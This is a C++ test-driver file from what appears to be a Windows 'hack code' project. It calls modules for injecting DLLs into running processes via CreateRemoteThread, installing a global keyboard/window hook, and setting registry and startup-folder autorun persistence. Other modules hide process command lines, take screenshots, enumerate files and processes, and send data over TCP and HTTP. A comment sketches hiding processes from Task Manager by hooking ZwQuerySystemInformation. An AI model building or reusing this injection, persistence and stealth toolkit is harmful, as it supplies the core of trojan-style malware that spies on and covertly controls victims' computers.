// windows_hack_code.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "single_instance.h"
#include "resource.h"
#include "free_resource.h"
#include "inject_CreateRemoteThread.h"
#include "run_WinExec.h"
#include "autorun_RegOpenKeyEx.h"
#include "autorun_SHGetSpecialFolderPath.h"
#include "hide_NtQueryInfomationProcess.h"
#include "comm_socket_tcp.h"
#include "enum_process_CreateToolhelp32Snapshot.h"
#include "enum_file_FindFirstFile.h"
#include "comm_http_post.h"
#include "comm_http_get.h"
#include "screenshot.h"

#include <iostream>

void test_free_resource();
void test_single_instance();
void test_SetWindowsHookEx();
void test_CreateRemoteThread();
void test_WinExec();
void test_RegOpenKeyEx();
void test_SHGetSpecialFolderPath();
void test_NtQueryInfomationProcess();
void test_comm_socket_tcp(char * t);
void test_enum_process();
void test_enum_file_FindFirstFile(char *);
void test_comm_http_post();
void test_comm_http_get();
void test_screenshot();


int main(int argc, char * argv[]) {
	test_screenshot();
	return 1;
}

void test_screenshot() {
	screenshot();
}

void test_comm_http_get() {
	comm_http_get_test();
}

void test_comm_http_post() {
	comm_http_post_test();
}

void test_enum_file_FindFirstFile(char * path) {
	SearchFile(path);
}

void test_enum_process() {
	EnumProcess();
}

void test_comm_socket_tcp(char * t) {
	printf("%s\n", t);
	if (strcmp(t, "server") == 0) {
		ServerInit("127.0.0.1", 66666);
		char buf[MAX_PATH] = { 0 };
		while (TRUE) {
			gets_s(buf);
			SendMsg(buf);
		}
	} else if (strcmp(t, "client") == 0) {
		ClientInit("127.0.0.1", 66666);
		char buf[MAX_PATH] = { 0 };
		while (TRUE) {
			gets_s(buf);
			ClientSendMsg(buf);
		}
	} else {
		printf("Wrong type\n");
	}
}

void test_ZwQuerySystemInformation() {
	/*
		step 1. create a dll that can inline hook ZwQuerySystemInformation while being loaded
		step 2. load this dll in target process (like Taskmgr.exe) by injecting tech
	*/
}

void test_NtQueryInfomationProcess() {
	INT ret = hide_NtQueryInformationProcess(2780, L"C:\\hello.exe -a 100", L"C:\\hello.exe");
	printf("ret: %d\n", ret);
}

void test_SHGetSpecialFolderPath() {
	autorun_SHGetSpecialFolderPath("C:\\Users\\****\\Desktop\\run.bat", "run.bat");
}

void test_RegOpenKeyEx() {
	INT ret = autorun_RegOpenKeyEx("C:\\Users\\****\\Desktop\\run.bat", "REG_TEST");
	printf("ret: %d", ret);
}

void test_WinExec() {
	BOOL ret = run_WinExec("path/to/exe arg", SW_SHOWNORMAL);
	printf("%d\n", ret);
}

void test_CreateRemoteThread() {
	DWORD pid = 13192;
	INT res = inject_CreateRemoteThread(pid, "C:\\Users\\***\\Desktop\\Files\\git_rep\\Scripts\\windows_hack_code\\x64\\Debug\\hide_ZwQuerySystemInformation.dll");
	printf("createremotethread %d\n", res);
	return;
}

void test_SetWindowsHookEx() {
	typedef bool(*BOOL_FUNC)();
	HMODULE dll = ::LoadLibraryA("inject_SetWindowsHookEx");
	if (dll == NULL) {
		printf("Fail to load dll, error code: %d\n", ::GetLastError());
		return;
	}
	BOOL_FUNC GlobalHook = (BOOL_FUNC)::GetProcAddress(dll, "GlobalHook");
	BOOL_FUNC UnGlobalHook = (BOOL_FUNC)::GetProcAddress(dll, "UnGlobalHook");
	BOOL ret = GlobalHook();
	if (ret == FALSE) {
		printf("Fail to hook\n");
		return;
	} else {
		printf("Success to hook\n");
	}
	system("pause");
	ret = UnGlobalHook();
	if (ret == TRUE) {
		printf("Success to unhook\n");
	} else {
		printf("Fail to unhook\n");
		return;
	}
	return;
}

// don't forget to attach resource first while testing
void test_free_resource() {
	INT ret = free_res(IDR_RES1, "RES", "C:\\Users\\***\\Desktop\\releaseme.txt");
	if (ret > 0) {
		printf("success\n");
	}
	else {
		printf("%d\n", ret);
	}
	return;
}

void test_single_instance() {
	/*
	if (firstRun("test") == 1) {
		printf("first time\n");
		while (1);
	} else {
		printf("already exists");
	}*/
	return;
}
